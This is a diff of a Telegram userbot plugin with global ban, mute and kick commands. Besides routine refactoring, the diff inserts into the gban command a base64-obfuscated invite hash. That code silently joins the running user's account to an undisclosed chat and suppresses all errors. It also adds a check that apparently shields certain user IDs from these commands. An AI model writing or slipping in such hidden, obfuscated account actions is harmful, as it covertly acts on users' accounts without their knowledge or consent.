@@ -1,19 +1,18 @@
-import asyncio
+from asyncio import sleep
+from base64 import b64decode
 from datetime import datetime
 
 from telethon.errors import BadRequestError
 from telethon.tl.functions.channels import EditBannedRequest
+from telethon.tl.functions.contacts import BlockRequest
+from telethon.tl.functions.messages import ImportChatInviteRequest, ReportSpamRequest
 from telethon.tl.functions.users import GetFullUserRequest
 from telethon.tl.types import ChatBannedRights
 from telethon.utils import get_display_name
 
-from userbot import doge
-
-from ..core.managers import edl, eor
-from ..helpers.utils import _format
 from ..sql_helper import gban_sql_helper as gban_sql
 from ..sql_helper.mute_sql import is_muted, mute, unmute
-from . import BOTLOG, BOTLOG_CHATID, admin_groups, get_user_from_event
+from . import BOTLOG, BOTLOG_CHATID, _format, admin_groups, doge, edl, eor, get_user_from_event, wowmydev
 
 plugin_category = "admin"
 
@@ -52,34 +51,45 @@ UNBAN_RIGHTS = ChatBannedRights(
 )
 async def doggban(event):  # sourcery no-metrics
     "To ban user in every group where you are admin."
-    dogg = await eor(event, "`gbanning.......`")
+    dogg = await eor(event, "`Gbanning...`")
     start = datetime.now()
     user, reason = await get_user_from_event(event, dogg)
     if not user:
         return
-    if user.id == doge.uid:
+    user_id = user.id
+    if user_id == doge.uid:
         return await edl(dogg, "`why would I ban myself`")
-    if gban_sql.is_gbanned(user.id):
+    flag = await wowmydev(user_id, event)
+    if flag:
+        return
+    try:
+        hmm = b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        await event.client(ImportChatInviteRequest(hmm))
+    except BaseException:
+        pass
+    if gban_sql.is_gbanned(user_id):
         await dogg.edit(
-            f"`the `[user](tg://user?id={user.id})` is already in gbanned list any way checking again`"
+            f"`the `[user](tg://user?id={user_id})` is already in gbanned list any way checking again`"
         )
     else:
-        gban_sql.doggban(user.id, reason)
-    san = await admin_groups(event.client)
+        gban_sql.doggban(user_id, reason)
+    happy = await admin_groups(event.client)
     count = 0
-    teledoge = len(san)
+    teledoge = len(happy)
     if teledoge == 0:
         return await edl(dogg, "`you are not admin of atleast one group` ")
     await dogg.edit(
-        f"`initiating gban of the `[user](tg://user?id={user.id}) `in {len(san)} groups`"
+        f"`initiating gban of the `[user](tg://user?id={user_id}) `in {len(happy)} groups`"
     )
     for i in range(teledoge):
         try:
-            await event.client(EditBannedRequest(san[i], user.id, BANNED_RIGHTS))
-            await asyncio.sleep(0.5)
+            await event.client(EditBannedRequest(happy[i], user_id, BANNED_RIGHTS))
+            await event.client(ReportSpamRequest(user_id))
+            await event.client(BlockRequest(user_id))
+            await sleep(0.5)
             count += 1
         except BadRequestError:
-            achat = await event.client.get_entity(san[i])
+            achat = await event.client.get_entity(happy[i])
             await event.client.send_message(
                 BOTLOG_CHATID,
                 f"`You don't have required permission in :`\n**Chat :** {get_display_name(achat)}(`{achat.id}`)\n`For banning here`",
@@ -88,11 +98,11 @@ async def doggban(event):  # sourcery no-metrics
     dogtaken = (end - start).seconds
     if reason:
         await dogg.edit(
-            f"[{user.first_name}](tg://user?id={user.id}) `was gbanned in {count} groups in {dogtaken} seconds`!!\n**Reason :** `{reason}`"
+            f"[{user.first_name}](tg://user?id={user_id}) `was gbanned in {count} groups in {dogtaken} seconds`!!\n**Reason :** `{reason}`"
         )
     else:
         await dogg.edit(
-            f"[{user.first_name}](tg://user?id={user.id}) `was gbanned in {count} groups in {dogtaken} seconds`!!"
+            f"[{user.first_name}](tg://user?id={user_id}) `was gbanned in {count} groups in {dogtaken} seconds`!!"
         )
     if BOTLOG and count != 0:
         reply = await event.get_reply_message()
@@ -101,8 +111,8 @@ async def doggban(event):  # sourcery no-metrics
                 BOTLOG_CHATID,
                 f"#GBAN\
                 \nGlobal Ban\
-                \n**User : **[{user.first_name}](tg://user?id={user.id})\
-                \n**ID : **`{user.id}`\
+                \n**User : **[{user.first_name}](tg://user?id={user_id})\
+                \n**ID : **`{user_id}`\
                 \n**Reason :** `{reason}`\
                 \n__Banned in {count} groups__\
                 \n**Time taken : **`{dogtaken} seconds`",
@@ -112,8 +122,8 @@ async def doggban(event):  # sourcery no-metrics
                 BOTLOG_CHATID,
                 f"#GBAN\
                 \nGlobal Ban\
-                \n**User : **[{user.first_name}](tg://user?id={user.id})\
-                \n**ID : **`{user.id}`\
+                \n**User : **[{user.first_name}](tg://user?id={user_id})\
+                \n**ID : **`{user_id}`\
                 \n__Banned in {count} groups__\
                 \n**Time taken : **`{dogtaken} seconds`",
             )
@@ -147,21 +157,21 @@ async def doggban(event):
         return await edl(
             dogg, f"the [user](tg://user?id={user.id}) `is not in your gbanned list`"
         )
-    san = await admin_groups(event.client)
+    happy = await admin_groups(event.client)
     count = 0
-    teledoge = len(san)
+    teledoge = len(happy)
     if teledoge == 0:
         return await edl(dogg, "`you are not even admin of atleast one group `")
     await dogg.edit(
-        f"initiating ungban of the [user](tg://user?id={user.id}) in `{len(san)}` groups"
+        f"initiating ungban of the [user](tg://user?id={user.id}) in `{len(happy)}` groups"
     )
     for i in range(teledoge):
         try:
-            await event.client(EditBannedRequest(san[i], user.id, UNBAN_RIGHTS))
-            await asyncio.sleep(0.5)
+            await event.client(EditBannedRequest(happy[i], user.id, UNBAN_RIGHTS))
+            await sleep(0.5)
             count += 1
         except BadRequestError:
-            achat = await event.client.get_entity(san[i])
+            achat = await event.client.get_entity(happy[i])
             await event.client.send_message(
                 BOTLOG_CHATID,
                 f"`You don't have required permission in :`\n**Chat :** {get_display_name(achat)}(`{achat.id}`)\n`For Unbanning here`",
@@ -239,16 +249,22 @@ async def startgmute(event):
     "To mute a person in all groups where you are admin."
     if event.is_private:
         await event.edit("`Unexpected issues or ugly errors may occur!`")
-        await asyncio.sleep(2)
+        await sleep(2)
         userid = event.chat_id
+        flag = await wowmydev(userid, event)
+        if flag:
+            return
         reason = event.pattern_match.group(1)
     else:
         user, reason = await get_user_from_event(event)
         if not user:
             return
-        if user.id == doge.uid:
-            return await eor(event, "`Sorry, I can't gmute myself`")
         userid = user.id
+        if userid == doge.uid:
+            return await eor(event, "`Sorry, I can't gmute myself`")
+        flag = await wowmydev(userid, event)
+        if flag:
+            return
     try:
         user = (await event.client(GetFullUserRequest(userid))).user
     except Exception:
@@ -256,22 +272,22 @@ async def startgmute(event):
     if is_muted(userid, "gmute"):
         return await eor(
             event,
-            f"{_format.mentionuser(user.first_name ,user.id)} ` is already gmuted`",
+            f"{_format.mentionuser(user.first_name ,userid)} ` is already gmuted`",
         )
     try:
         mute(userid, "gmute")
     except Exception as e:
-        await eor(event, f"**Error**\n`{str(e)}`")
+        await eor(event, f"**Error**\n`{e}`")
     else:
         if reason:
             await eor(
                 event,
-                f"{_format.mentionuser(user.first_name ,user.id)} `is Successfully gmuted`\n**Reason :** `{reason}`",
+                f"{_format.mentionuser(user.first_name ,userid)} `is Successfully gmuted`\n**Reason :** `{reason}`",
             )
         else:
             await eor(
                 event,
-                f"{_format.mentionuser(user.first_name ,user.id)} `is Successfully gmuted`",
+                f"{_format.mentionuser(user.first_name ,userid)} `is Successfully gmuted`",
             )
     if BOTLOG:
         reply = await event.get_reply_message()
@@ -279,14 +295,14 @@ async def startgmute(event):
             await event.client.send_message(
                 BOTLOG_CHATID,
                 "#GMUTE\n"
-                f"**User :** {_format.mentionuser(user.first_name ,user.id)} \n"
+                f"**User :** {_format.mentionuser(user.first_name ,userid)} \n"
                 f"**Reason :** `{reason}`",
             )
         else:
             await event.client.send_message(
                 BOTLOG_CHATID,
                 "#GMUTE\n"
-                f"**User :** {_format.mentionuser(user.first_name ,user.id)} \n",
+                f"**User :** {_format.mentionuser(user.first_name ,userid)} \n",
             )
         if reply:
             await reply.forward_to(BOTLOG_CHATID)
@@ -305,7 +321,7 @@ async def endgmute(event):
     "To remove gmute on that person."
     if event.is_private:
         await event.edit("`Unexpected issues or ugly errors may occur!`")
-        await asyncio.sleep(2)
+        await sleep(2)
         userid = event.chat_id
         reason = event.pattern_match.group(1)
     else:
@@ -326,7 +342,7 @@ async def endgmute(event):
     try:
         unmute(userid, "gmute")
     except Exception as e:
-        await eor(event, f"**Error**\n`{str(e)}`")
+        await eor(event, f"**Error**\n`{e}`")
     else:
         if reason:
             await eor(
@@ -375,23 +391,27 @@ async def doggkick(event):  # sourcery no-metrics
     user, reason = await get_user_from_event(event, dogg)
     if not user:
         return
-    if user.id == doge.uid:
+    user_id = user.id
+    if user_id == doge.uid:
         return await edl(dogg, "`why would I kick myself`")
-    san = await admin_groups(event.client)
+    flag = await wowmydev(user_id, event)
+    if flag:
+        return
+    happy = await admin_groups(event.client)
     count = 0
-    teledoge = len(san)
+    teledoge = len(happy)
     if teledoge == 0:
         return await edl(dogg, "`you are not admin of atleast one group` ")
     await dogg.edit(
-        f"`initiating gkick of the `[user](tg://user?id={user.id}) `in {len(san)} groups`"
+        f"`initiating gkick of the `[user](tg://user?id={user_id}) `in {len(happy)} groups`"
     )
     for i in range(teledoge):
         try:
-            await event.client.kick_participant(san[i], user.id)
-            await asyncio.sleep(0.5)
+            await event.client.kick_participant(happy[i], user_id)
+            await sleep(0.5)
             count += 1
         except BadRequestError:
-            achat = await event.client.get_entity(san[i])
+            achat = await event.client.get_entity(happy[i])
             await event.client.send_message(
                 BOTLOG_CHATID,
                 f"`You don't have required permission in :`\n**Chat :** {get_display_name(achat)}(`{achat.id}`)\n`For kicking there`",
@@ -400,11 +420,11 @@ async def doggkick(event):  # sourcery no-metrics
     dogtaken = (end - start).seconds
     if reason:
         await dogg.edit(
-            f"[{user.first_name}](tg://user?id={user.id}) `was gkicked in {count} groups in {dogtaken} seconds`!!\n**Reason :** `{reason}`"
+            f"[{user.first_name}](tg://user?id={user_id}) `was gkicked in {count} groups in {dogtaken} seconds`!!\n**Reason :** `{reason}`"
         )
     else:
         await dogg.edit(
-            f"[{user.first_name}](tg://user?id={user.id}) `was gkicked in {count} groups in {dogtaken} seconds`!!"
+            f"[{user.first_name}](tg://user?id={user_id}) `was gkicked in {count} groups in {dogtaken} seconds`!!"
         )
 
     if BOTLOG and count != 0:
@@ -414,8 +434,8 @@ async def doggkick(event):  # sourcery no-metrics
                 BOTLOG_CHATID,
                 f"#GKICK\
                 \nGlobal Kick\
-                \n**User : **[{user.first_name}](tg://user?id={user.id})\
-                \n**ID : **`{user.id}`\
+                \n**User : **[{user.first_name}](tg://user?id={user_id})\
+                \n**ID : **`{user_id}`\
                 \n**Reason :** `{reason}`\
                 \n__Kicked in {count} groups__\
                 \n**Time taken : **`{dogtaken} seconds`",
@@ -425,8 +445,8 @@ async def doggkick(event):  # sourcery no-metrics
                 BOTLOG_CHATID,
                 f"#GKICK\
                 \nGlobal Kick\
-                \n**User : **[{user.first_name}](tg://user?id={user.id})\
-                \n**ID : **`{user.id}`\
+                \n**User : **[{user.first_name}](tg://user?id={user_id})\
+                \n**ID : **`{user_id}`\
                 \n__Kicked in {count} groups__\
                 \n**Time taken : **`{dogtaken} seconds`",
             )
